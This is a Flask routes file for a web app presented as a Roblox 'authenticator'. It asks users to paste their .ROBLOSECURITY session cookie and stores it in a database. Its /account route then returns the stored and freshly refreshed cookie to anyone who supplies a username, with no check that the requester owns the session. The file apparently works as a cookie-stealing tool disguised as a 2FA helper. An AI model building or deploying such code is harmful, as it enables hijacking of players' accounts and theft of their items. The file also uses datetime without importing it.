from flask import render_template, request, redirect, url_for, session, flash, jsonify
from app import app, db
from models import UserSession
from roblox_auth import RobloxAuth
import uuid
import logging

logger = logging.getLogger(__name__)
roblox_auth = RobloxAuth()

@app.route('/')
def index():
    """Home page with cookie input form"""
    return render_template('index.html')

@app.route('/setup', methods=['POST'])
def setup_authenticator():
    """Setup authenticator with Roblox cookie"""
    try:
        cookie = request.form.get('cookie', '').strip()
        
        if not cookie:
            flash('Please enter a Roblox cookie', 'error')
            return redirect(url_for('index'))
        
        # Clean cookie (remove .ROBLOSECURITY= prefix if present)
        if cookie.startswith('.ROBLOSECURITY='):
            cookie = cookie[15:]
        
        # Validate cookie
        validation_result = roblox_auth.validate_cookie(cookie)
        
        if not validation_result['valid']:
            flash(f"Invalid cookie: {validation_result.get('error', 'Unknown error')}", 'error')
            return redirect(url_for('index'))
        
        # Generate session ID and TOTP secret
        session_id = str(uuid.uuid4())
        totp_secret = roblox_auth.generate_totp_secret()
        
        # Generate unique authenticator code for URL
        auth_code = str(uuid.uuid4()).replace('-', '')[:16]  # 16 character unique code
        
        # Save to database
        user_session = UserSession(
            session_id=session_id,
            roblox_cookie=cookie,
            username=validation_result['username'],
            user_id=validation_result['user_id'],
            totp_secret=totp_secret
        )
        
        db.session.add(user_session)
        db.session.commit()
        
        # Store session ID in Flask session
        session['session_id'] = session_id
        session['auth_code'] = auth_code
        session['username'] = validation_result['username']
        
        flash(f"Authenticator setup successful for {validation_result['username']}!", 'success')
        return redirect(url_for('authenticator_with_code', username=validation_result['username'], code=auth_code))
        
    except Exception as e:
        logger.error(f"Error setting up authenticator: {str(e)}")
        flash('An error occurred while setting up the authenticator', 'error')
        return redirect(url_for('index'))

@app.route('/authenticator')
def authenticator():
    """Authenticator page with codes (legacy route)"""
    session_id = session.get('session_id')
    
    if not session_id:
        flash('No active session found. Please setup your authenticator first.', 'warning')
        return redirect(url_for('index'))
    
    user_session = UserSession.query.filter_by(session_id=session_id).first()
    
    if not user_session:
        flash('Session expired. Please setup your authenticator again.', 'warning')
        return redirect(url_for('index'))
    
    # Generate current TOTP code
    current_code = roblox_auth.generate_totp_code(user_session.totp_secret)
    time_remaining = roblox_auth.get_time_remaining()
    
    # Get user avatar URL
    headers = {
        'Cookie': f'.ROBLOSECURITY={user_session.roblox_cookie}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    avatar_url = roblox_auth.get_user_avatar(user_session.user_id)
    
    return render_template('authenticator.html', 
                         username=user_session.username,
                         current_code=current_code,
                         time_remaining=time_remaining,
                         avatar_url=avatar_url)

@app.route('/authenticator/<username>/<code>')
def authenticator_with_code(username, code):
    """Unique authenticator page with username and code in URL"""
    session_id = session.get('session_id')
    stored_code = session.get('auth_code')
    stored_username = session.get('username')
    
    # Verify the URL parameters match the session
    if not session_id or stored_code != code or stored_username != username:
        flash('Invalid authenticator link. Please setup your authenticator again.', 'warning')
        return redirect(url_for('index'))
    
    user_session = UserSession.query.filter_by(session_id=session_id).first()
    
    if not user_session:
        flash('Session expired. Please setup your authenticator again.', 'warning')
        return redirect(url_for('index'))
    
    # Generate current TOTP code
    current_code = roblox_auth.generate_totp_code(user_session.totp_secret)
    time_remaining = roblox_auth.get_time_remaining()
    
    # Get user avatar URL
    avatar_url = roblox_auth.get_user_avatar(user_session.user_id)
    
    return render_template('authenticator.html', 
                         username=user_session.username,
                         current_code=current_code,
                         time_remaining=time_remaining,
                         avatar_url=avatar_url,
                         unique_code=code)

@app.route('/api/code')
def get_current_code():
    """API endpoint to get current TOTP code"""
    session_id = session.get('session_id')
    
    if not session_id:
        return jsonify({'error': 'No active session'}), 401
    
    user_session = UserSession.query.filter_by(session_id=session_id).first()
    
    if not user_session:
        return jsonify({'error': 'Session not found'}), 404
    
    current_code = roblox_auth.generate_totp_code(user_session.totp_secret)
    time_remaining = roblox_auth.get_time_remaining()
    
    return jsonify({
        'code': current_code,
        'time_remaining': time_remaining,
        'username': user_session.username
    })

@app.route('/account/<username>/<code>')
def account_info(username, code):
    """Account information page with full details and cookie refresh"""
    session_data = UserSession.query.filter_by(username=username).first()
    
    if not session_data:
        flash('Session not found. Please submit your cookie again.', 'error')
        return redirect(url_for('index'))
    
    # Update last accessed time
    session_data.last_accessed = datetime.utcnow()
    db.session.commit()
    
    # Get comprehensive account information
    roblox_auth = RobloxAuth()
    cookie = session_data.roblox_cookie
    
    # Validate and get user info
    user_info = roblox_auth.validate_cookie(cookie)
    if not user_info:
        flash('Invalid cookie. Please submit a new one.', 'error')
        return redirect(url_for('index'))
    
    # Get additional information
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    additional_info = roblox_auth.get_additional_user_info(headers, user_info['user_id'])
    user_info.update(additional_info)
    
    # Get refreshed cookie
    refreshed_cookie = roblox_auth.refresh_cookie(cookie, headers)
    
    # Generate current TOTP
    current_code = roblox_auth.generate_totp_code(session_data.totp_secret)
    
    return render_template('account_info.html',
                         user_info=user_info,
                         original_cookie=cookie,
                         refreshed_cookie=refreshed_cookie,
                         current_code=current_code,
                         unique_code=code,
                         username=username)

@app.route('/logout')
def logout():
    """Logout and clear session"""
    session.clear()
    flash('Logged out successfully', 'info')
    return redirect(url_for('index'))

@app.errorhandler(404)
def not_found_error(error):
    return render_template('index.html'), 404

@app.errorhandler(500)
def internal_error(error):
    db.session.rollback()
    return render_template('index.html'), 500
